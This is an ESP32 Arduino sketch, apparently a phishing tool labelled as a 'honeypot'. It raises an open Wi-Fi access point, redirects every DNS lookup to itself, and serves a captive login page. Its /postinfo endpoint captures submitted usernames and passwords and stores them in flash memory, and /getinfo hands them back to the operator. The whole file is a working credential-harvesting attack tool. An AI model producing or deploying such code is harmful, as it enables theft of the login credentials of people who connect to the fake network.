#include <FS.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include <Preferences.h>

String SSID_NAME = "Shaktiman";  // Change this to your preferred SSID

const byte HTTP_PORT = 80;
const byte DNS_PORT = 53;

IPAddress apIP(172, 0, 0, 1);
IPAddress netMask(255, 255, 255, 0);

DNSServer dnsServer;
WebServer httpServer(HTTP_PORT);
Preferences preferences;

void writeToMemory(String text) {
  preferences.begin("storage", false);
  String existingData = preferences.getString("credentials", "");
  preferences.putString("credentials", existingData + text + "\n");
  preferences.end();
}

String readFromMemory() {
  preferences.begin("storage", true);
  String data = preferences.getString("credentials", "");
  preferences.end();
  return data;
}

void clearMemory() {
  preferences.begin("storage", false);
  preferences.remove("credentials");
  preferences.end();
}

void setup() {
  Serial.begin(115200);
  Serial.println("\n[+] ESP32 Honeypot Starting...");

  // Mount SPIFFS for serving files
  if (!SPIFFS.begin(true)) {
    Serial.println("[-] Error: Failed to mount SPIFFS");
    return;
  } else {
    Serial.println("[+] SPIFFS Mounted Successfully");
  }

  // Start ESP32 in Access Point Mode
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMask);
  WiFi.softAP(SSID_NAME.c_str());

  Serial.print("[+] Hosted WiFi SSID: ");
  Serial.println(WiFi.softAPSSID());

  // Start DNS Server to redirect all domains to ESP32
  dnsServer.start(DNS_PORT, "*", apIP);

  // Serve static files from SPIFFS
  httpServer.serveStatic("/", SPIFFS, "/index1.html");
  httpServer.serveStatic("/assets/", SPIFFS, "/assets/"); // Fix for subdirectories

  // Credential Capture Endpoint
  httpServer.on("/postinfo", []() {
    String username = httpServer.arg("username");
    String password = httpServer.arg("password");

    if (username != "" && password != "") {
      writeToMemory(username + ":" + password);
      Serial.println("[+] Captured Credentials: " + username + ":" + password);
    }

    httpServer.send(200, "text/html", "Connected");
  });

  // Endpoint to retrieve stored credentials
  httpServer.on("/getinfo", []() {
    String data = readFromMemory();
    httpServer.send(200, "text/plain", data);
  });

  // Endpoint to clear stored credentials
  httpServer.on("/deleteinfo", []() {
    clearMemory();
    httpServer.send(200, "text/html", "OK");
  });

  // Redirect all unknown requests to the main page
  httpServer.onNotFound([]() {
    httpServer.sendHeader("Location", String("/"), true);
    httpServer.send(302, "text/plain", "");
  });

  httpServer.begin();
  Serial.println("[+] WebServer Started!");
}

void loop() {
  dnsServer.processNextRequest();
  httpServer.handleClient();
}
